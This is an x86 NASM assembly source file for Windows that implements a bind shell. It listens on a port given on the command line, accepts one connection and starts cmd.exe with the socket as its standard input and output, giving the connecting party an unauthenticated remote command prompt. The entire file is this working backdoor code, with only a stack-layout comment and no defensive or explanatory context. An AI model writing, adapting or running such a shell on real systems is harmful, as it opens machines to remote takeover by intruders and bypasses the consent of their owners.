; WSDATA (190),
; STARTUPINFO(44),
; PROCESS_INFORMATION(10),
; struct sockaddr_in (10)
; int (4)
;	---------------------
;	|	Stack 	    |
;	+++++++++++++++++++++ +0x0
;	| 	 port 	    | 		[ebp - 0x4]
;	+++++++++++++++++++++ +0x4 
;	| 	socket1     | 		[ebp - 0x8]
;	+++++++++++++++++++++ +0x8 
;	| 	socket2	    | 		[ebp - 0xC]
;	+++++++++++++++++++++ +0xC
;	|      sockaddr_in  |  		[ebp - 0x1C]
;	+++++++++++++++++++++ +0x1C 
;	|    PROCESS_INFO   | 		[ebp - 0x2C]
;	+++++++++++++++++++++ +0x2C
;	|    STARTUP_INFO   | 		[ebp - 0x70]
;	+++++++++++++++++++++ +0x70 
;	|      WSDATA	    | 		[ebp - 0x200]
;	+++++++++++++++++++++ +0x200

global _main

extern _printf
extern _atoi
extern _strlen
extern _memset
extern _bind@12
extern _listen@8
extern _htons@4
extern _WSAStartup@8
extern _WSASocketA@24
extern _WSAAccept@20
extern _ExitProcess@4
extern _CreateProcessA@40

section .data
	ArgErrorMessage db "[*] usage: ./%s <port>", 0xA ,0x0
	cmd 			db "cmd.exe", 0x0

section .text

_main:
	push 	ebp
	mov		ebp, esp
	sub		esp, 0x200
	xor		eax, eax
	mov		eax, dword [ebp+0x8]
	cmp		eax, 0x2
	jnz		_error
	; Parse Args
	xor		eax, eax
	mov		eax, dword [ebp+0xC]
	mov		eax, dword [eax]
	push	eax
	call 	_strlen
	add		eax, 1
	mov		ecx, dword [ebp+0xC]
	mov		ecx, dword [ecx]
	add		ecx, eax
	push	ecx
	call 	_atoi
	mov		dword [ebp-0x4], eax	; port = eax
	xor		eax, eax
	lea		eax, [ebp-0x200]		
	push	eax 				; WSADATA
	push	0x202 				; version
	call	_WSAStartup@8
	
	push    0               	; dwFlags
	push    0               	; g
	push    0               	; lpProtocolInfo
	push    6               	; protocol
	push    1               	; type
	push    2               	; af
	call	_WSASocketA@24
	
	mov		[ebp-0x8], eax		; socket = eax
	mov 	ecx, 2			
	mov		[ebp-0x1C], cx		; server.sin_family = AF_INET
	xor 	eax, eax
	mov		eax, dword [ebp-0x4]
	push	eax
	call 	_htons@4
	mov		[ebp-0x1A], ax 		; server.sin_port = htons(port)
	mov		dword [ebp-0x18], 0 ; server.sin_addr.s_addr = INADDR_ANY
	push 	0x10				; sizeof(server)
	xor 	eax, eax
	lea 	eax, [ebp - 0x1C]
	push 	eax
	mov 	ecx, [ebp-0x8]
	push	ecx
	call 	_bind@12
	push 	0x7fffffff			; SOMAXCONN
	xor 	edx, edx
	mov 	edx, [ebp-0x8] 
	push	edx
	call 	_listen@8
	push    0               	; dwCallbackData
	push    0               	; lpfnCondition
	push    0               	; addrlen
	push    0               	; addr
	xor 	eax, eax
	mov     eax, [ebp-0x8]
	push    eax             	; s
	call 	_WSAAccept@20  
	mov 	[ebp - 0xC], eax
	push 	0x44
	push 	0
	lea 	ecx, [ebp-0x70]
	push 	ecx
	call 	_memset
	mov 	dword [ebp-0x70], 0x44
	mov 	dword [ebp-0x44], 0x100
	mov 	edx, [ebp-0xC]
	mov 	dword [ebp-0x30], edx
	mov 	ecx, dword [ebp-0x30]
	mov 	dword [ebp-0x34], ecx
	mov 	eax, dword [ebp-0x34]
	mov 	dword [ebp-0x38], eax
	lea 	edx, [ebp-0x2C]
	push 	edx
	lea		eax, [ebp-0x70]
	push 	eax
	push    0               	; lpCurrentDirectory
	push    0               	; lpEnvironment
	push    0               	; dwCreationFlags
	push    1               	; bInheritHandles
	push    0               	; lpThreadAttributes
	push    0               	; lpProcessAttributes
	push    cmd
	push    0               	; lpApplicationName
	call 	_CreateProcessA@40
	jmp 	_exit

_error:
	xor		eax, eax
	mov		eax, dword[ebp+0xC]
	mov		ecx, [eax]
	push	ecx	
	push 	ArgErrorMessage
	call	_printf
	xor		eax, eax
	add		eax, 1
_exit:
	add		esp, 0x200
	push	eax
	call 	_ExitProcess@4
